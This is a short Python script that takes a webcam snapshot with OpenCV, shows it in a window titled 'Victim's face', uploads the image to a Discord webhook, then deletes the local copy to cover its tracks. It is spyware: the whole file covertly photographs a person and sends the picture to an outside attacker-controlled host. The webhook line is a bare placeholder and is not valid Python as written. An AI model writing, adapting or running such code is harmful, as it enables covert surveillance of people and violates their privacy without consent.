import cv2
import os
import requests

def send_to_discord(screenshot):
    with open("capture.png", 'rb') as img_file:
        url = YOUR DISCORD WEBHOOK
        data = {"file": ('capture.png', img_file, "image/png")}
        requests.post(url, files=data)

capture = cv2.VideoCapture(0)

while True:
    _, frame = capture.read()
    cv2.imshow("Victim's face", frame)
    cv2.imwrite("capture.png", frame)
    file = "capture.png"
    send_to_discord(f'capture.png')
    os.remove(file)
    break

capture.release()
cv2.destroyAllWindows()